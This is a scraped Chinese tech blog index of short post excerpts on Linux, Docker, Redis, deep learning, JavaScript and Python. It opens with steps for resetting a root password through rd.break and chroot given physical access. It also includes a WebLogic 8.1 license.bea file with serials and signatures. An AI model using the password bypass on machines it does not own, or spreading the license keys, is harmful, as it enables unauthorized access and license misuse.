（2）下面页面输入"1" 选 continue
（3）进入系统然后输入下面命令可更改root密码：
chroot /mnt/sysimage/ passwd root exit reboot 二、单用户方式改密码
1、启动的时候，在启动界面内核条目上，选择相应启动项，内核名称上按“e”；
2、进入后，找到linux16开头的地方，按“end”键到最后，输入rd.break，按ctrl+x进入；
3、进去后输入命令mount，发现根为/sysroot/，并且不能写，只有ro=readonly权限；
4、重新挂载mount -o remount,rw /sysroot/，之后mount，发现有了r,w权限；
5、chroot /sysroot/ 改变根；
（1）echo redhat|passwd –stdin root 修改root密码为redhat，或者输入passwd，交互修改；
（2）还有就是先cp一份，然后修改/etc/shadow文件
6、touch /.autorelabel 这句是为了selinux生效
7、ctrl+d 退出
8、然后reboot
经验证，两种方式均可实现重置密码，但前提条件是能拿到本机。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f93fdeea7fe621931d155844edc3020/" rel="bookmark">
			Redis单机安装配置说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		获取配置文件： wget -P /usr/local/redis http://download.redis.io/redis-stable/redis.conf 修改配置文件： vi /usr/local/redis/redis.conf 启动容器： docker run -d --name redis -p 6379:6379 -v /usr/local/redis/redis.conf:/etc/redis/redis.conf redis redis-server /etc/redis/redis.conf --appendonly yes --requirepass '123456' 参数说明-d后台运行容器–name redis设置容器名为 redis-p 6379:6379将宿主机 6379 端口映射到容器的 6379 端口-v /usr/local/redis/redis.conf:/etc/redis/redis.conf将宿主机redis.conf映射到容器内-v /usr/local/redis/data:/data将宿主机 /usr/local/redis/data 映射到容器 /data , 方便备份持久数据redis-server /etc/redis/redis.confredis 服务以容器内的 redis.conf 配置启动–appendonly yesredis 数据持久化–requirepass ‘123456’连接密码 进入容器： docker exec -it app_learn /bin/bash 测试连接： ./redis-cli -h 127.0.0.1 -p 6379 输入 auth 123456#你刚才设置的密码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31197e67ee595d04793ee558da7d51fd/" rel="bookmark">
			如何利用Pycharm将工程文件上传到服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先点击Tools-&gt;Deployment-&gt;Configuration
进入界面：
如果之前我们已经设置好了远程服务器，那么就直接选择。如果没有设置好，就选择左侧的"+"号
设置好connection之后，我们点击mappings，它可以设置我们代码的本地路径以及对应的服务器路径，这里我们最好将工程文件夹命名设置为相同的，便于我们管理。
随后点击ok即可，这样pycharm就帮助本地工程与服务器对应的文件夹建立了映射关系。
随后我们上传工程文件：首先点击workspace的工程文件夹（我们要上传的文件），如果只想上传某一个py文件，就直接点击那个文件即可。
点击Tools-&gt;Deployment-&gt;upload to即可将本地选中的文件上传到我们在mappings内设置的文件
如果我们在本地对代码作了修改，想同步到服务器，则选择Tools-&gt;Deployment-&gt;Sync
在这里你可以看到本地与服务器不同的文件（这里我们没有不同，因此没有显示文件）
如果有不同，点击左上角的同步按钮即可。
上传后我们就可以在右侧的remote host内看到服务期内我们已经上传成功的文件夹
双击文件夹或者文件就可以打开远程服务器上的文件（文件名前面有远程服务器的地址）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9d57c8943fa094bbc912b4cdcbf21bc/" rel="bookmark">
			Web资源服务器搭建之一samba服务搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Web资源服务器 Web资源服务器可以将自身的存储空间共享给应用服务器，在Linux上，可以通过samba服务实现文件共享。如果Web资源服务器性能足够的情况，还需通过Nginx服务器提供对资源文件：图片、CSS文件、JAVASCRIPT文件、PDF等文档文件的访问。
Web资源服务器搭建博客分为两篇，一是samba服务器搭建，就是此博客。二是Nginx服务器搭建。
Samba服务搭建 如果服务器是云服务器或者在内网环境搭建了linux包库源，可以直接通过yum(CentoS 8以下)或者apt-get(Ubuntu)安装samba服务；如果服务器是内网离线服务器，可以通过Docker镜像搭建服务。
Docker制作Samba镜像 参考文章 docker dperson/samba镜像
Docker — 从入门到实践
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3d45017829e58eaeeef521a1eb0cd0d/" rel="bookmark">
			深度学习基础 | RNN家族全面解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者 | Chilia 整理 | NewBeeNLP
首先，请阅读先修知识：深度学习基础 | 从Language Model到RNN
1. 梯度消失和梯度爆炸 1.1 梯度消失 【定义】当很多的层都用特定的激活函数(尤其是sigmoid函数)，损失函数的梯度会趋近于0，因此模型更加不容易训练。(As more layers using certain activation functions are added to neural networks, the gradients of the loss function approaches zero, making the network hard to train.)
以最简单的网络结构为例，假如有三个隐藏层，每层的神经元个数都是1，且对应的非线性函数为sigmoid:
每个节点的输出 , 那么
梯度消失的罪魁祸首是sigmoid函数，在sigmoid函数靠近0和1的位置，其导数很小。很多小的值相乘，导致最终的梯度很小。
sigmoid函数和其导数 由于我们初始化的网络权值通常都小于1，因此当层数增多时，小于0的值不断相乘，最后就导致梯度消失的情况出现。同理，当权值过大时，导致大于1的值不断相乘，就会产生梯度爆炸。
如果一个深层网络有很多层，梯度消失导致网络只等价于后面几层的浅层网络的学习，而前面的层不怎么更新了：
深层网络 在RNN中，也会出现梯度消失的问题，比如下面这个例子：
这里应该填"ticket",但是如果梯度非常的小，RNN模型就不能够学习在很久之前出现的词语和现在要预测的词语的关联。也就是说，RNN模型也不能把握长期的信息。
「梯度消失有几种常见的解决方法：」
用下文提到的LSTM/GRU
加上一些skip-connection, 让梯度直接流过而不经过bottleneck。例如resnet：
用Relu、Leaky relu等激活函数
ReLu：让激活函数的导数为1
LeakyReLu：包含了ReLu的几乎所有优点，同时解决了ReLu中0区间带来的影响
1.2 梯度爆炸 回忆梯度更新的公式：
那么，如果梯度太大，则参数更新的过快。步子迈的太大就会导致训练非常不稳定(训飞了)，甚至最后loss变成「Inf」。
梯度爆炸的解决方法：
（1）gradient clipping
如果梯度大于某个阈值了，就对其进行裁剪，让它不要高于那个阈值。
(2) 权重正则化。如果发生梯度爆炸，那么权值的范数就会变的非常大。通过限制正则化项的大小，也可以在一定程度上限制梯度爆炸的发生。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3d45017829e58eaeeef521a1eb0cd0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b851dbabd1367b8fde08e20da21f4c60/" rel="bookmark">
			resolve函数参数是个promise
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 resolve函数的参数除了正常的值以外，还可能是另一个 Promise 实例，比如像下面这样。 const p1 = new Promise(function (resolve, reject) { // ... }); const p2 = new Promise(function (resolve, reject) { // ... resolve(p1); }) 上面代码中，p1和p2都是 Promise 的实例，但是p2的resolve方法将p1作为参数，即一个异步操作的结果是返回另一个异步操作。 注意，这时p1的状态就会传递给p2，也就是说，p1的状态决定了p2的状态。如果p1的状态是pending，那么p2的回调函数就会等待p1的状态改变；如果p1的状态已经是resolved或者rejected，那么p2的回调函数将会立刻执行。 const p1 = new Promise(function (resolve, reject) { setTimeout(() =&gt; reject(new Error('fail')), 3000) }) const p2 = new Promise(function (resolve, reject) { setTimeout(() =&gt; resolve(p1), 1000) }) p2 .then(result =&gt; console.log(result)) .catch(error =&gt; console.log(error)) // Error: fail 上面代码中，p1是一个 Promise，3 秒之后变为rejected。p2的状态在 1 秒之后改变，resolve方法返回的是p1。由于p2返回的是另一个 Promise，导致p2自己的状态无效了，由p1的状态决定p2的状态。所以，后面的then语句都变成针对后者（p1）。又过了 2 秒，p1变为rejected，导致触发catch方法指定的回调函数。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cec2e760641734eb58d1ba6356bd762c/" rel="bookmark">
			ACwing:算法基础课 第二章单链表，双链表，队列，栈以及KMP听课笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
本次课程的前半部分讲链表和栈队列的时候都有多种的实现方式，比如可以通过用指针和结构体的方式去实现链表，也可以通过STL库直接实现栈和队列。但是本次课程主要就是讲用数组进行模拟，原因如下：
效率问题。通过数组模拟的效率比较高，如果利用结构体和指针实现链表的话，每次存进去的时候都要new一个结点，但是这个效率非常慢。一般都是有十万级别的，所以用动态链表去实现的时候，太耗时间了，全部都花在新建结点上面了。
如上图所示的这个动态存储的方式一般不用。但是如果进行优化一下还是可以用这个来实现的，优化的方式就是直接先初始化有多少个结点，就是不要去new了，这样的话这个原理就和数组差不多，省去了new的时间。
一。链表与邻接表
1。用数组模拟单链表，考得最多的是模拟邻接表的情况
（1）邻接表的作用
1⃣️存储图
2⃣️存储树
（2）数组模拟单链表的方法
首先需要两个数组e和ne，前者是用来存元素的，e的下标就表示结点的序号，内容就是表示该结点存的元素。ne 数组存的是下一个指向结点的位置，它的下标表示该结点的序号，里面存的是该结点指向的下一个结点的序号。
（3）模版代码如下：
1⃣️先设置出必要元素数组e,he,头指针head以及指针idx
2⃣️编写初始化函数。一开始head为-1，因为-1表示为链表尾的号码。IDX 为0，指向第一个。
3⃣️编写插入函数。
第一种插入情况：插入为头结点。分三步，第一步将数据存入到当前idx指向的结点e[idx]=new。第二步将新点的ne指向原来head指向的下一个结点位置。第三步head指回到新的头结点。第四步，idx++
第二种插入情况：将点插入到结点为k的点的后面。分四步走。第一步将新结点的数据存进来，e[idx]=new;第二步将新结点的ne 指向k结点的ne;第三步将k结点的ne指向新结点；第四步idx++
4⃣️编写删除结点函数。
第一种情况：将结点k后面的结点删除。直接将该结点k的ne指向厚厚一个，即ne[k]=ne[ne[k]]；第二种情况：将头结点删除直接就是head=ne[head]即可
第二种情况的代码如下：
总的代码如下：
// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点 int head, e[N], ne[N], idx; // 初始化 void init() { head = -1; idx = 0; } // 在链表头插入一个数a,尾插法，head和idx一直往后运动 void insert(int a) { e[idx] = a, ne[idx] = head, head = idx ++ ; } // 将头结点删除，需要保证头结点存在 void remove() { head = ne[head]; } 2。用数组模拟双链表，考得最多的是用来优化某些问题
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cec2e760641734eb58d1ba6356bd762c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9c907026502e03907443ca1c14ac6e2/" rel="bookmark">
			Linux命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件操作 递归创建目录 mkdir -p test1/test3/test4
删除有子目录的目录 mrdir -p test1/test3/test4 rm (移除文件或目录）
-f 忽略不存在的文件，不会出现警告，强制删除
-r 递归删除目录
-i 互动，删除询问是否删除
mv （移动文件或目录）
-f 强制移动
-u 只替换已更新过的文件
文件属性
第一个字符代表这个文件是目录、文件或链接文件
为d 则是目录
为 - 则是文件
为 l 则表示链接文档（link file）
接下来的字符，以三个为一组，且均为‘rwx’三个参数的组合
r 代表可读，w代表可写，x代表可执行
这三个权限的位置不会改变，如果没有权限，就会出现减号-
chgrp：更改文件属组
chgrp [-R] 属组名 文件名
-R：递归更改文件属组，就是在更改某个目录文件的属组
chown：更改文件属主，也可以同时更改文件属组
chown [-R] 属主名 文件名
chown [-R] 属主名：属组名 文件名
chmod：更改文件9个属性
Linux文件的基本权限就有9个，分别是owner/group/others三种身份各有自己的read/write/execute权限
r：4 w：2 x：1
chmod 777 文件赋予所有用户可读可执行
文件内容查看 cat由第一行开始显示文件内容，用来读文章，或者读取配置文件
tac：从最后一行开始显示
nl：显示的是否，顺便把输出行号
more:一页一页的显示文件内容，（空格代表翻页，enter看下一行）
less：与more类似，不同的是，他可以往前翻，（上下键代表翻动页面）
链接 Linux链接分为两种：硬链接、软链接
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c9c907026502e03907443ca1c14ac6e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9559c490cfad4b03dc6821011c1b82f2/" rel="bookmark">
			Linux docker 环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux docker 环境搭建 Linux搭建Docker 环境一、安装域配置1.安装依赖包2.设置阿里云镜像源3.安装Docker-CE4.启动Docker-CE5.[可选]为Docker建立用户组5.1 建立 Docker 用户组5.2 添加当前用户到 docker 组 6.镜像加速器配置 Docker 安装本地仓库1.下载 docker registry私有镜像2.修改配置文件3.从容器中启动Registry4.修改配置文件4.推送镜像 Docker 开发外部访问端口1、编辑docker文件：/usr/lib/systemd/system/docker.service设置防火墙 Springboot + Docker项目发布 Linux搭建Docker 环境 一、安装域配置 1.安装依赖包 sudo yum install -y yum-utils device-mapper-persistent-data lvm2 2.设置阿里云镜像源 sudo yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 3.安装Docker-CE 重建yum缓存安装docker-ce，请执行一下安装命令 sudo yum install docker-ce 4.启动Docker-CE sudo systemctl enable docker sudo systemctl start docker 5.[可选]为Docker建立用户组 docker 命令与 Docker 引擎通讯之间通过 UnixSocket ，但是能够有权限访问 UnixSocket 的用户只有 root 和 docker 用户组的用户才能够进行访问，所以我们需要建立一个 docker 用户组，并且将需要访问 docker 的用户添加到这一个用户组当中来
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9559c490cfad4b03dc6821011c1b82f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae4cbbd135d32cc3456ddfeb13703b3f/" rel="bookmark">
			接口测试(case设计 流程图解析 数据类型)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接口测试 1. 接口测试定义2. 接口测试用例设计2.1 接口格式case设计2.1.1 接口格式模块拆分 2.2 case参数验证2.2.1 “必须”与“非必须”概念。2.2.2 强制登陆效验2.2.3 参数的容错性 3.流程图解析3.1 依赖服务异常3.2 数据存储与读取3.2.1 数据存储3.2.2 数据读取 4 rpc是什么5 幂等性的含义与使用场景5.1 幂等性含义5.2 使用场景 6 接口字段的数据类型6.1 四大数据类型6.2 Number类6.3 String类6.4 integer6.4.1、Integer是int的包装类，int则是java的一种基本数据类型6.4.2、Integer变量必须实例化后才能使用，而int变量不需要6.4.3、Integer实际是对象的引用，当new一个Integer时，实际上是生成一个指针指向此对象；而int则是直接存储数据值6.4.4、Integer的默认值是null，int的默认值是0 1. 接口测试定义 接口：主要是子模块或者子系统间交互并相互作用的部分，这里说的接口是广义的，客户端与后台服务间的协议；插件间通信的接口；模块间的接口；再小到一个类提供的方法；都可以理解为接口。
接口测试：是指针对模块或系统间接口进行的测试，我们也可以理解为端到端的测试，只不过是前端到后段-后段到中台的测试。
2. 接口测试用例设计 在功能测试的过程中，我们的case设计思路一般都是模块化编写，或者是用户的体验过程编写，然后我们加上接口返回参数的容错性测试，网络异常的兜底，兼容其他状态等等。
那么在接口测试的case里，这种用例的设计思路只占其中一部分，需要结合前端的prd与接口的技术文档与接口文档并行去完成。（这里是个人case设计习惯与思路，欢迎参考与补充～）
2.1 接口格式case设计 首先我们可以在一级标题下面拆分成两个子模块，分别是接口格式与需求模块内容。
顾名思义就是接口内格式的case与需求的case分别放在对应不同的模块内。
这里可以参考养成一个好习惯，在最上方的位置单独拉出模块记录文档与地址内容，功能case可以粘贴prd地址与需求背景目的(需求目的可以让我们更好的理解需求的侧重点)，这里是以前的一个端上需求case，可以对比一下出入。
“开宝箱”与“拉新红包回流”是两个接口，那么我们就按照接口来拆分一级标题。并且能看到一级标题下接口格式的子标题是通用的。
2.1.1 接口格式模块拆分 对照接口文档内编写接口格式内case
能很直观的看出架构的拆分，首先是接口的url地址，然后是请求参数的格式（接口请求类型，入参，强制登陆效验与请求头），最后是返回参数。
2.2 case参数验证 2.2.1 “必须”与“非必须”概念。 必须就是入参与返回参数内比带的字段，不带就会引发接口报错或者前段找不到对应字段报错。
非必须是在特定的场景下才会触发相对的字段上传或者返回，比如我开宝箱，开出了道具类奖品那么我接口返回的就会是道具类相关的非必传字段。那如果我开出了现金红包，那么就会返回红包相关的非必传字段，这时候就不会返回道具类相关的非必传字段了（这里稍微强调一下，必传与非必传的字段确定是前后端通过协商决定的）。
2.2.2 强制登陆效验 强制登陆效验是个测试点，比如一定要验证用户的信息与状态，通常是存储在cookie内。
2.2.3 参数的容错性 那么这时候有的同学就会问，我们写这个入参与返回参数测试什么。 接口测试内需要测试入参的字段正确性、错误性、边界值与容错性，返回正确与错误还有错误码。
容错性测试其实就是值的各种状态（可以参考一下以前客户端的case）
这里的不会出现异常指的是客户端无法解析server返回参数，从而出现crash。
边界值在接口测试内需要注意的主要就是数据类型的边界值，数据类型在后面的“接口字段的数据类型内会有比较详细的介绍”。
3.流程图解析 技术文档内会有流程路，方便我们更好的理解实现过程与经过。
首先我们能看到接口与各个中台rpc交互的过程，并且也能看到先后顺序，结合流程图写出测试case。
如：客户端点击功能进行了请求 那么这时候就会请求接口 这就是流程图内其中的一步。
3.1 依赖服务异常 前段到后段如果有问题，过程可能是 前段-&gt;后段 请求有问题 也有可能是 前段&lt;-后段 返回有问题。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae4cbbd135d32cc3456ddfeb13703b3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94e38a40a5ebaac1a609b57f623acfe9/" rel="bookmark">
			[SQL] Query 6hl_cloud_codegen start[ERR] 1049 - Unknown error 1049[ERR] USE pigxx_codeg
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运行SQL文件时报 [SQL] Query 6hl_cloud_codegen start
[ERR] 1049 - Unknown error 1049
[ERR] USE pigxx_codegen;
SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;
找到sql文件打开
修改USE pigxx_codegen;为数据库名
运行成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23abd7074b25adf56b44fe3fa770cb34/" rel="bookmark">
			微信小程序--cascaser，联机选择器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用的是uview组件库
HTML
&lt;view class="contract-type"&gt; &lt;label style="margin-left: 5rpx;"&gt;参与者&lt;/label&gt; &lt;view class="uni-list"&gt; &lt;view class="uni-list-cell"&gt; &lt;view class="uni-list-cell-db " @click="selectShows = true"&gt; &lt;u-select mode="single-column" v-model="selectShows" :list="list" @confirm="(val)=&gt;confirm(val,2,frist)"&gt;&lt;/u-select&gt; &lt;view class="cyzclass" v-for="(item,index) in cyzList_no" :key="index"&gt; &lt;span @click.stop="cursorFn(item,index)"&gt;{{ item }}&lt;/span&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;!-- 删除提交弹窗 --&gt; &lt;view class="setup-out" v-show="deleteShow"&gt; &lt;view class="setup-out-text"&gt;确定是否删除 &lt;span style="color: red;"&gt;{{peopleName}}&lt;/span&gt;&lt;/view&gt; &lt;view class="setup-btn"&gt; &lt;button @click="deleteShow = false"&gt;取消&lt;/button&gt; &lt;button @click="deleteFN"&gt;确定&lt;/button&gt; &lt;/view&gt; &lt;/view&gt; js
data() { const currentDate = this.getDate({ format: true }); return { deleteShow:false, selectShows:false, user_id:'', peopleName:'', list: [], cyzList_no:[], frist:'', to_do_user_no:'', params: { to_do_title: null, to_do_list: null, to_do_user_no: '', to_do_user_list:[], to_do_time: currentDate, to_do_plan_time: currentDate, to_do_deadline: currentDate, to_do_state: 1, to_do_remark: null }, }; }, methods: { // select点击事件 confirm(e,num,frist) { if(num == 1){ this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23abd7074b25adf56b44fe3fa770cb34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9f0804b50a7994340d1bd2ed2facc62/" rel="bookmark">
			WebLogic 8.1 license.bea
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		license.bea
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;bea-licenses&gt; &lt;license-group format="1.0" product="WebLogic Platform" release="8.1"&gt; &lt;license component="2PC" cpus="unvalued" expiration="never" ip="any" licensee="Customer" serial="454493271161-2665064475175" type="SDK" units="unlimited" signature="MCwCFFewqWMmfmFwT1SBqoZRGpT+20MhAhQ+GFFHpTIgVpXgAagb2h8Q8ym82w==" /&gt; &lt;license component="Cluster" cpus="unvalued" expiration="never" ip="any" licensee="Customer" serial="454493271161-2665064475175" type="SDK" units="unlimited" signature="MC0CFQDDIZrZY9zFoICg5g9njXYcGC2bugIUFkXlIm7/yTUY+JzD5RZuPN9lrS4=" /&gt; &lt;license component="Clustered JMS" cpus="unvalued" expiration="never" ip="any" licensee="Customer" serial="454493271161-2665064475175" type="SDK" units="unlimited" signature="MC0CFQDFBMxGfJkDpY9MwkaJTAtEZJh5WwIUBxHJo5YNNw6AywwQSfwVa5Yx7+k=" /&gt; &lt;license component="Connector" cpus="unvalued" expiration="never" ip="any" licensee="Customer" serial="454493271161-2665064475175" type="SDK" units="unlimited" signature="MC0CFEfF1UdPPAUT+qE7x+Hl/dCE1AkCAhUAhGVzvlUG569iYQ7YK9gIBEgL5bI=" /&gt; &lt;license component="EJB 1.0" cpus="unvalued" expiration="never" ip="any" licensee="Customer" serial="454493271161-2665064475175" type="SDK" units="unlimited" signature="MC4CFQCx9r2/nrzfUpJtMQYI54FsPCGwNwIVANFg37J1w8JhtNFWiVUSAIvaERT2" /&gt; &lt;license component="EJB 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c9f0804b50a7994340d1bd2ed2facc62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08e6237b2e046e6815006b72d5e13ea1/" rel="bookmark">
			超详细从零开始安装yolov5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步：安装Anconda
- Anconda环境搭建
后面的所以操作都需要在anconda的yolo的环境下进行的，
https://www.anaconda.com/products/individual#Downloads
下载对应版本anconda即可，这里就不介绍anconda安装过程了。
第二步：创建以及查看yolo环境是否安装成功
anconda安装好后，打开anconda，为yolov5创建一个环境，注意这里用的python版本是3.8，版本过低后面可能会报错。
conda create -n yolo python=3.8 conda info -e 第三步：切换到yolo环境下（下面的步骤都在该环境下运行） activate yolo 第四步：下载jupyter notebook,后期我们进行yolo模型训练代码的编写需要用到jupyter notebook。
jupyter notebook 第五步：yolov5下载
https://github.com/ultralytics/yolov5
下载yolov5源码，解压，可以看到里面有requirements.txt文件，里面记录了需要安装的包，这个txt文件可以帮助我们一键下载这些依赖包。
第六步：安装yolov5依赖包
复制下面的代码进入yolov5-master路径(这样才能找到requirements.txt文件)
xxxx为yolov5-master路径
cd /d xxxxxx 然后输入以下命令（为了提高下载速度改到清华镜像了） pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirements.txt 就会自动帮我们把这些依赖安装好了。yolov5就算安装成功了接下来我们就要开始训练yolo模型了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9c6abfb3fa31005ea8ff382897d8e08/" rel="bookmark">
			Mark Word 详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mark Word 在32位 JVM 中：
Mark Word 在64位 JVM 中：
锁标志位（lock）
区分锁状态，11时表示对象待GC回收状态, 只有最后2位锁标识(11)有效。
biased_lock
是否偏向锁，由于无锁和偏向锁的锁标识都是 01，没办法区分，这里引入一位的偏向锁标识位。
分代年龄（age）
表示对象被GC的次数，当该次数到达阈值的时候，对象就会转移到老年代。
对象的hashcode（hash）
运行期间调用System.identityHashCode()来计算，延迟计算，并把结果赋值到这里。当对象加锁后，计算的结果31位不够表示，在偏向锁，轻量锁，重量锁，hashcode会被转移到Monitor中。
偏向锁的线程ID（JavaThread）：
偏向模式的时候，当某个线程持有对象的时候，对象这里就会被置为该线程的ID。 在后面的操作中，就无需再进行尝试获取锁的动作。
epoch
偏向锁在CAS锁操作过程中，偏向性标识，表示对象更偏向哪个锁。
ptr_to_lock_record
轻量级锁状态下，指向栈中锁记录的指针。当锁获取是无竞争的时，JVM使用原子操作而不是OS互斥。这种技术称为轻量级锁定。在轻量级锁定的情况下，JVM通过CAS操作在对象的标题字中设置指向锁记录的指针。
ptr_to_heavyweight_monitor：重量级锁状态下，指向对象监视器Monitor的指针。如果两个不同的线程同时在同一个对象上竞争，则必须将轻量级锁定升级到Monitor以管理等待的线程。在重量级锁定的情况下，JVM在对象的ptr_to_heavyweight_monitor设置指向Monitor的指针。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd39306b940b51633d912105e479306f/" rel="bookmark">
			win 7 电脑错误676、734、678、651等解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#错误676、734等解决办法 运营商办理的网络接入方式都会提供宽带账号和密码。在使用拨号上网的时候，经常会出现各种错误代码导致不能上网。以下是个人理解的处理办法。觉得实用请分享，不喜勿喷！
01、错误691：由于域上的用户名和/或密码无效而拒绝访问。 原因：一般是由账号密码错误引起的，能看到这样的错误，能证明一点，网络线路是正常的。
解决：1.检查宽带账号密码是否正确，账户前是否空格。
2.宽带账户是否欠费。 3.宽带账号没有在所对应的开户地使用。 4.电脑网线接错到猫所带的IPTV专用端口上，正确接在网口上。 4.宽带账户是否短时间内，在别的上网设备上正常登陆过，路由器也算上网设备。往往有些原因电脑能拨号正常，设置路由器后不能正常拨号，需要克隆电脑的MAC地址给路由器，路由器拨号才能正常，也是这种原因。运营商会绑定宽带账户和上网设备的MAC地址，防止他人盗用宽带帐号密码。 02.错误629:远程计算机没有响应断开连接 原因：也是账号引起的错误，线路正常。
解决：1.填写正确的宽带账号密码，多拨几次试试。
2.查询宽带账号是否欠费。 3.禁用本地连接，重新启用。 4.删除宽带连接，重新创建。（查看错误619） 03.错误676：电话占线。 原因：一般都是由电脑网卡引起的，或者是由宽带账户非正常下线引起的，系统认为宽带账户没有下线。
解决：1.非正常下线，需要等待系统自动释放宽带账户，一般是5到60分钟。
2.常见都是电脑网卡引起的，需要更改网卡的MAC地址了，操作如下： （1）右键单击 我的电脑 ，管理，点击 设备管理器 找到有线网卡。
（2）双击打开有线网卡属性，高级，找到 网络地址或Network Address。填写新的网卡地址即mac地址，mac地址是有12位的16进制数，新的mac地址要和别人的不一样就没问题了。
（3）查看本机原有的mac地址，点击 开始 运行或者WIN键+R，输入命令CMD，再执行ipconfig/all来查看。
04.错误734：PPP链接控制协议终止。 原因：说白了，就是上网人太多了，IP地址不够分了。或宽带拨号程序出现问题了。
解决：1.IP地址不够分，多连几次总会连上的。或在 网络连接的页面中找到 宽带连接 右键 属性 下图：
勾选 为单链路连接协商多重连接。
2.删除现有宽带连接，创建新的宽带连接。（查看错误619） 05.错误619：不能建立到远程计算机的连接，因此用于此链接的端口已关闭。 原因: 账号密码错，或拨号未断开的情况下直接拔掉网线。宽带连接设置错误。
解决：重新建立宽带拨号
1.删除原有宽带连接，桌面的宽带连接只是个快捷方式，需要在网络连接里面删除。 2.以WIN7为例，点击 开始→控制面板 → 网络和Internet → 查看网络状态和任务→ 设置新的连接或网络 3.新窗口中选择 连接到Internet → 下一步 → 仍要设置新连接 →否，创建新链接 →下一步 → 宽带（PPPOE）
4. 连接后跳过认证账号密码，进入 更改适配器设置 中就能看到新建的宽带连接，右键发送到桌面快捷方式即可。
06.错误718：因远程计算机不能及时反映，此连接已被终止。 原因：不管哪种错误代码，只要显示 真正核对用户名和密码，都账号引起的错误信息。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd39306b940b51633d912105e479306f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37ab19d540948ee46e2fdbda1fc5c278/" rel="bookmark">
			Python 元组(tuple)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		元组（tuple）是 python中另一个重要的序列结构，和列表类似，元组也是由一系列按特定顺序排序的元素组成。
元组和列表（list）的不同之处在于：
列表的元素是可以更改的，包括修改元素值，删除和插入元素，所以列表是可变序列；而元组一旦被创建，它的元素就不可更改了，所以元组是不可变序列。 元组也可以看做是不可变的列表，通常情况下，元组用于保存无需修改的内容。
从形式上看，元组的所有元素都放在一对小括号( )中，相邻元素之间用逗号,分隔，如下所示：
(element1, element2, ... , elementn)
其中 element1~elementn 表示元组中的各个元素，个数没有限制，只要是 Python 支持的数据类型就可以。
从存储内容上看，元组可以存储整数、实数、字符串、列表、元组等任何类型的数据，并且在同一个元组中，元素的类型可以不同，例如：
("c.biancheng.net", 1, [2,'a'], ("abc",3.0))
在这个元组中，有多种类型的数据，包括整形、字符串、列表、元组。
另外，我们都知道，列表的数据类型是 list，那么元组的数据类型是什么呢？我们不妨通过 type() 函数来查看一下：
&gt;&gt;&gt; type( ("c.biancheng.net",1,[2,'a'],("abc",3.0)) )
&lt;class 'tuple'&gt;
